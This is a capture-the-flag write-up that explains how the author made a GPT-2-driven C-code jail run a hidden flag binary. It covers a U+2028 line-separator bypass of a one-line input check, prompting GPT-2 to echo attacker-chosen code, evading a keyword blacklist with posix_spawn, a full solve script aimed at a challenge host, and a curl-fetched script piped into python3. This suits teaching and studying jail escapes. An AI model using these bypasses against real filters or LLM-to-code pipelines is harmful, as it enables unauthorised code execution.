# Vibe Code — Write-up (39 solves)

## TL;DR
You don’t “write C code” directly. You give a one-line prompt to a local GPT‑2 model. The server extracts a fenced Markdown C code block from the model’s output, compiles it, and runs it in a jail. The flag is printed by a hidden executable (`/readflag`) that is **executable but not readable**, so the goal is to generate C that **executes** `/readflag` without using blacklisted strings.

**Final flag (remote):** `uoftctf{transformers_only_became_cool_with_gpt3.5_so_grats_on_making_it_work}`

---

## What the challenge is trying to hide / test

This is an “easy C jail” with a twist:

1. **You’re forced to use “AI output” as your C source.** You don’t submit code; you submit a prompt.
2. **The server only accepts C code if it appears inside a Markdown fenced block** that starts with exactly ` ```c ` on its own line.
3. **The prompt is “one line only”**, so you can’t normally write a multiline Markdown code block.
4. **Keyword blacklist** blocks common ways to spawn processes:
   - `system`
   - `exec`
   - `open` (this is sneaky: it also blocks `fopen`, `popen`, `openat`, etc.)
5. **The flag program is not readable** (`chmod 111 /readflag`), so you can’t read it as a file; you must *run* it.

The “hidden trick” is that the one-line check only blocks `\n` and `\r`, but Python’s `splitlines()` recognizes other line separators such as **Unicode U+2028 LINE SEPARATOR**. That lets you smuggle “newlines” through the prompt filter and create a valid fenced C block for the extractor.

---

## Source walkthrough (local files)

### `vibe_code.py`
Key points:

- Reads your input with `prompt = input("User: ")`
- Rejects prompts containing a real newline: if `"\n"` or `"\r"` is in the input, it exits.
- Runs GPT‑2 (`openai-community/gpt2`) to generate an “Assistant” response.
- Extracts C code only if the output contains:
  - a line ` ```c ` (case-insensitive `c`)
  - then lines of code
  - then a closing line ` ``` `
- Rejects the code if it contains any of: `system`, `exec`, `open` (substring match, case-insensitive).
- Compiles the extracted C and runs it inside `nsjail`.

### `run_vibe_code.sh`
Compiles with strict flags:

```sh
gcc -o /tmp/a.out -Wall -Wextra -Wpedantic -Werror <file.c>
```

So the generated C must compile cleanly (warnings become errors).

### `readflag.c`
In the provided container it prints `TEST{FLAG}` (placeholder), but on the remote it prints the real flag.
It’s installed as `/readflag` and made **execute-only** (`chmod 111`).

---

## Exploit strategy

### Step 1: Make the model output a *valid* ` ```c ... ``` ` block
The parser in `extract_c_code()` is strict about structure, and you can’t type actual newlines in the prompt.

**Bypass:** Use Unicode line separator **U+2028** (`\u2028`) inside the prompt.

- The input check only blocks `\n` and `\r`, so `\u2028` is allowed.
- Later, `extract_c_code()` does `text.splitlines()` which *does* treat `\u2028` as a line break.

So your “one-line” prompt can still behave like multiple lines when the server parses it.

### Step 2: Don’t rely on GPT‑2 to “follow instructions”
GPT‑2 is not instruction-tuned. Asking nicely for code often fails (“Missing C code”).

Instead, **put the exact code block you want inside the prompt**. GPT‑2 tends to **repeat** recent text (especially with greedy decoding), so the completion frequently begins by echoing what you provided.

The most reliable pattern here is to start the prompt with a line separator so the first “line” is literally ` ```c `.

### Step 3: Execute `/readflag` without blacklisted words
You can’t use:

- `system(...)`
- any `exec*` call name (contains `exec`)
- anything containing `open` (even `fopen` / `popen`)

Use `posix_spawn()` instead:

- Doesn’t contain the substring `exec`
- Spawns a process (internally uses `execve`, but the blacklist is only on source text)

Minimal C payload:

```c
#include <spawn.h>
#include <sys/types.h>
#include <sys/wait.h>

extern char **environ;

int main(void) {
  pid_t pid;
  char *argv[] = {"/readflag", 0};
  int rc = posix_spawn(&pid, "/readflag", 0, 0, argv, environ);
  if (rc != 0) return 1;
  int st = 0;
  (void)waitpid(pid, &st, 0);
  return 0;
}
```

---

## Step-by-step solve (remote)

### 0) Connect
The service requires a proof-of-work (PoW) first:

```sh
nc 34.23.133.46 5000
```

You’ll see something like:

```
== proof-of-work: enabled ==
You can run the solver with:
    python3 <(curl -sSL https://goo.gle/kctf-pow) solve s....
Solution?
```

### 1) Solve the PoW
Easiest manual way:

```sh
python3 <(curl -sSL https://goo.gle/kctf-pow) solve <challenge_token>
```

Copy the long `s....` string it prints (ignore the literal text `Solution:`; it’s printed to stderr by the script).
Paste that back into the netcat session.

### 2) Send the “one-line” prompt that smuggles newlines
You need a prompt that is **one line** but contains `\u2028` separators.

It’s easiest to do this with a Python script so you don’t have to manually type the Unicode character.

### 3) Get the flag
Once the generated C runs, it executes `/readflag` and prints the flag.

---

## Full solve script (does PoW + exploit)

Save as `solve.py` anywhere and run with `python3 solve.py`:

```py
import base64
import re
import select
import socket
import time

import gmpy2

HOST = "34.23.133.46"
PORT = 5000

VERSION = "s"
MODULUS = 2**1279 - 1


def decode_number(enc: str) -> int:
    return int.from_bytes(base64.b64decode(enc.encode()), "big")


def decode_challenge(enc: str):
    parts = enc.split(".")
    if parts[0] != VERSION:
        raise ValueError("bad pow version")
    return [decode_number(p) for p in parts[1:]]


def encode_number(num: int) -> str:
    size = (num.bit_length() // 24) * 3 + 3
    return base64.b64encode(num.to_bytes(size, "big")).decode()


def encode_challenge(arr) -> str:
    return ".".join([VERSION] + [encode_number(x) for x in arr])


def sloth_root(x: int, diff: int, p: int) -> int:
    exponent = (p + 1) // 4
    x = gmpy2.mpz(x)
    for _ in range(diff):
        x = gmpy2.powmod(x, exponent, p).bit_flip(0)
    return int(x)


def solve_pow(chal: str) -> str:
    diff, x = decode_challenge(chal)
    y = sloth_root(x, diff, MODULUS)
    return encode_challenge([y])


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # Read banner until PoW prompt.
    banner = b""
    while b"Solution?" not in banner:
        banner += s.recv(4096)
    banner_text = banner.decode("utf-8", "replace")
    print(banner_text, end="")

    m = re.search(r"solve\\s+(s\\.[A-Za-z0-9+/=_.-]+)", banner_text)
    if not m:
        raise RuntimeError("could not find PoW token in banner")
    chal = m.group(1)

    t0 = time.time()
    sol = solve_pow(chal)
    print(f"[+] PoW solved in {time.time()-t0:.2f}s")
    s.sendall((sol + "\\n").encode())

    # Wait for the actual prompt.
    buf = b""
    while b"User:" not in buf:
        buf += s.recv(4096)
    print(buf.decode("utf-8", "replace"), end="")

    LS = "\\u2028"  # Unicode LINE SEPARATOR

    c_code = LS.join(
        [
            "#include <spawn.h>",
            "#include <sys/types.h>",
            "#include <sys/wait.h>",
            "",
            "extern char **environ;",
            "",
            "int main(void) {",
            "  pid_t pid;",
            "  char *argv[] = {\\\"/readflag\\\", 0};",
            "  int rc = posix_spawn(&pid, \\\"/readflag\\\", 0, 0, argv, environ);",
            "  if (rc != 0) return 1;",
            "  int st = 0;",
            "  (void)waitpid(pid, &st, 0);",
            "  return 0;",
            "}",
        ]
    )

    # Start with LS so ` ```c ` is on its own “line” for splitlines().
    prompt = LS + "```c" + LS + c_code + LS + "```"
    s.sendall((prompt + "\\n").encode("utf-8"))

    # Print everything until the server stops sending.
    end = time.time() + 120
    while time.time() < end:
        r, _, _ = select.select([s], [], [], 1)
        if not r:
            continue
        chunk = s.recv(4096)
        if not chunk:
            break
        print(chunk.decode("utf-8", "replace"), end="")


if __name__ == "__main__":
    main()
```

If everything works, you’ll see the service print something like “C Program detected …” and then the output from `/readflag` (the flag).

---

## Common mistakes / debugging

- **“Missing C code”**: the model output didn’t contain a ` ```c ... ``` ` block. The U+2028 trick + embedding the code block directly is what fixes this.
- **“Blacklisted keyword detected.”**: your extracted C contains `system`, `exec`, or `open` *anywhere* (even inside comments/strings). Avoid `fopen`, `popen`, etc.
- **GCC Error**: your code triggered a warning (treated as error). Make sure headers/types are correct and you aren’t leaving unused variables.
